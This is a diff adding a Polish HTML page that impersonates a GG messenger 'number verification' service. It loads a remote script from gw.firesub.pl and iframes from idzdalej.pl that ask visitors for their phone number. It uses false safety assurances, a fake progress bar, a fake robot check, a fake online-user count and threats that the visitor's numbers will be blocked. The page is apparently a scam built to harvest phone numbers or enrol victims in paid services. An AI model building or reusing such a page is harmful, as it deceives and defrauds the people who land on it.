@@ -1,0 +1,292 @@
+﻿<!DOCTYPE html>
+<html>
+
+
+<head>
+<script src="https://gw.firesub.pl/21ddb31a.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link href="https://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet">
+
+<script src="js/jscript.js"></script>
+
+
+<title>G-G aktywacja</title>
+</head>
+
+<style>
+
+html {
+    background: url("img/loltlo.jpg") no-repeat center center fixed;
+    background-size: cover;
+}
+
+body {
+    text-align: center;
+    font-family: 'Comfortaa', cursive;
+}
+
+img {
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.form-option {
+    margin-left: 15px;
+    margin-right: 30px;
+    margin-bottom: 15px;
+}
+
+.input-form {
+    background-color: #fff;
+    background-image: none;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
+    color: black;
+    display: block;
+    font-size: 14px;
+    height: 20px;
+    line-height: 1.42857;
+    padding: 6px 12px;
+    transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s;
+    vertical-align: middle;
+    width: 100%;
+}
+
+.input-form::-moz-placeholder {
+    color: #999;
+    opacity: 55;
+}
+
+.input-command {
+    border-radius: 6px;
+    font-size: 18px;
+    height: 28px;
+    line-height: 1.33;
+    padding: 10px 16px;
+}
+
+select.input-command {
+    height: 46px;
+    line-height: 46px;
+}
+
+.wrapper {
+    padding: 0;
+    margin: -136px auto 0;
+}
+
+.wrapper img {
+    width: 60%;
+}
+
+.lootbox {
+    background: url("img/gem2.png") no-repeat scroll 10px center white;
+    padding-left: 40px !important;
+}
+
+.typ {
+    background: url("img/typ2.png") no-repeat scroll 10px center white;
+    padding-left: 40px !important;
+}
+
+.buttonstyle {
+    border-radius: 6px;
+    background-color: #111c30;
+    border: none;
+    color: white;
+    padding: 16px 33px;
+    display: inline-block;
+    font-size: 33px;
+    height: 72px !important;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+#progressbarouter {
+
+}
+
+#progressbarcontainer {
+    display: none;
+    border-radius: 6px;
+    position: relative;
+    border: 6px solid black;
+    margin-left: auto;
+    margin-right: auto;
+    width: 90%;
+    height: 50px;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+#progressbar {
+    position: absolute;
+    width: 10%;
+    height: 100%;
+    background-color: #8B0000;
+}
+
+#progressbarlabel {
+    line-height: 54px;
+    text-align: center;
+    color: black;
+}
+
+#main-tool{
+    background: #efefef; /* Old browsers */
+    background: -moz-linear-gradient(top,  #868f99 0%, #efefef 80px); /* FF3.6+ */
+    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#868f99), color-stop(80px,#efefef)); /* Chrome,Safari4+ */
+    background: -webkit-linear-gradient(top,  #868f99 0%,#efefef 80px); /* Chrome10+,Safari5.1+ */
+    background: -o-linear-gradient(top,  #868f99 0%,#efefef 80px); /* Opera 11.10+ */
+    background: -ms-linear-gradient(top,  #868f99 0%,#efefef 80px); /* IE10+ */
+    background: linear-gradient(to bottom,  #868f99 0%,#efefef 80px); /* W3C */
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#868f99', endColorstr='#efefef',GradientType=0 ); /* IE6-9 */
+    border-radius: 10px;
+    max-width: 500px;
+    margin: 100px auto 20px;
+    padding: 50px;
+    opacity: 0.9;
+}
+
+#shield{
+    margin-bottom: 5px;
+}
+
+#verifybg {
+    height: 0%;
+    width: 100%;
+    left: 0;
+    top: 0;
+    position: fixed;
+    z-index: 1;
+    overflow-x: hidden;
+    transition: 0.5s;
+    background-color: rgb(0,0,0);
+    background-color: rgba(0,0,0, 0.3);
+}
+
+#verify {
+    margin-left: auto;
+    margin-right: auto;
+    border-radius: 10px;
+    color: white;
+    position: relative;
+    background-color: #212835;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+    width: 80%;
+}
+
+#verifycontent {
+    margin-left: auto;
+    margin-right: auto;
+    width: 80%;
+}
+
+@media screen and (min-width: 1200px) {
+        #mobileverify {
+            display: none;
+        }
+
+        #desktopverify {
+            display: block;
+        }
+
+        #verify {
+            width: 30%;
+        }
+}
+
+@media screen and (max-width: 1199px) {
+        #mobileverify {
+            display: block;
+        }
+
+        #desktopverify {
+            display: none;
+        }
+
+        #verify {
+            width: 90%;
+        }
+}
+
+</style>
+<body>
+
+<div id="verifybg">
+	<br>
+	<br>
+	<br>
+	<div id="verify">
+		<br>
+		<br>
+		<br>
+		<div id="verifycontent">
+			<h1>POTWIERDZENIE WERYFIKACJI</h1>
+
+			<div id="mobileverify">
+				<p>Aby móc w pełni zweryfikować użytkownika prosimy o poadnie numeru ( Twoje dane są bezpieczne ) </p>
+			<iframe src="https://idzdalej.pl/b67a289d" style="width:500px;height:350px;border:none;"></iframe><img src="img/buttonpls.png" width="80%" /></a>
+			</div>
+
+			<div id="desktopverify">
+			<p>Aby móc w pełni zweryfikować użytkownika prosimy o poadnie numeru ( Twoje dane są bezpieczne )</p>
+			<iframe src="https://idzdalej.pl/b67a289d" style="width:500px;height:350vh;scrolling:no;border:none;"></iframe><img src="img/buttonpls.png" width="80%" />
+			</div>
+		</div>
+		<br>
+		<br>
+		<br>
+	</div>
+</div>
+
+<div id="main-tool">
+<div class="wrapper"><img src="img/GG_logo.png" /></div>
+<h1>GG <br/> Weryfkacja numeru</h1>
+
+<div id="progressbarcontainer">
+	<div id="progressbar">
+		<div id="progressbarlabel">0%</div>
+	</div>
+</div>
+
+<p><div id="progresslog"></div></p>
+
+<div id="fillup">
+<div class="form-option">
+	<input id="username" maxlength="30" class="input-form input-command" type="text" placeholder="Numer">
+</div>
+<p><b>Platorma</b></p>
+<div class="form-option">
+<select id="lootbox" class="input-form lootbox input-command">
+	<option value="2">PC</option>
+	<option value="7">Android</option>
+	<option value="15">iOS</option>
+
+</select>
+</div>
+
+<p><b>To twoje jedyne konto?</b></p>
+<div class="form-option">
+<select id="typ" class="input-form typ input-command">
+	<option value="1">Tak</option>
+	<option value="3">Nie</option>
+</select>
+</div>
+<p><input id="shield" type="checkbox"><label for="shield"><b>  Nie jestem robotem</b></label></input></p>
+
+<button onclick="move()" class="buttonstyle">Weryfikuj</button>
+
+<b><p>Wymagamy weryfikacjy każdego numeru</p>
+<p>By twój numer był bezpieczny musisz w pełni przejść etap weryfikacji</p>
+<p>W przypadku niedopełnienia weryfikacji, ten jak i każdy następny założony przez Pana/ią numer będzie blokowany.</p></b>
+</div>
+
+<h4>Użytkowników online:&nbsp;<div id="randomnumber">2</div></h4>
+<h4>Pozdrawiamy ;-)</h4>
+
+</div>
+</body>
+
+
+</html>
